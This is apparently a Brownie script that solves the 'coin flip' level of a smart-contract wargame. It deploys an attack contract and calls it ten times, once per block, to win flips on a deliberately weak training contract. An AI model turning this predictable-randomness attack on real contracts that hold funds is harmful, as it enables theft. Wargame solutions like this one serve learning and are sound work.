from brownie import CoinFlip, CoinFlipAttack

from scripts.helpful_scripts import (
    get_account,
    get_level_contract,
    submit_instance,
    print_out_if_level_solved,
)

LEVEL_NAME = "03_coin_flip"
INTERFACE_CONTRACT = CoinFlip


def solve_level(level_contract):
    account = get_account()
    print(f"Started to solve {LEVEL_NAME}")
    coin_flip_attack = CoinFlipAttack.deploy({"from": account})
    # We need to have 10 transactions and not one because CoinFlip contract allows only one win per block
    for x in range(10):
        # Added gas_limit because of below error on Rinkeby
        #   ValueError: Gas estimation failed: 'execution reverted'.
        #   This transaction will likely revert. If you wish to broadcast, you must set the gas limit manually.
        # Added allow_revert:True because of below error on Rinkeby
        #   ValueError: Execution reverted during call: 'execution reverted'.
        #   This transaction will likely revert. If you wish to broadcast, include `allow_revert:True` as a transaction parameter.
        tx = coin_flip_attack.flipAttack(
            level_contract.address,
            {"from": account, "allow_revert": True, "gas_limit": 10000000},
        )
        tx.wait(1)
        consecutiveWins = level_contract.consecutiveWins()
        print("Our consecutive wins -> " + str(consecutiveWins))


# brownie run scripts/_03_coin_flip.py --network rinkeby-fork
def main():
    level_contract = get_level_contract(LEVEL_NAME, INTERFACE_CONTRACT)
    solve_level(level_contract)
    level_solved = submit_instance(level_contract.address)
    print_out_if_level_solved(level_solved, LEVEL_NAME)
    return level_solved
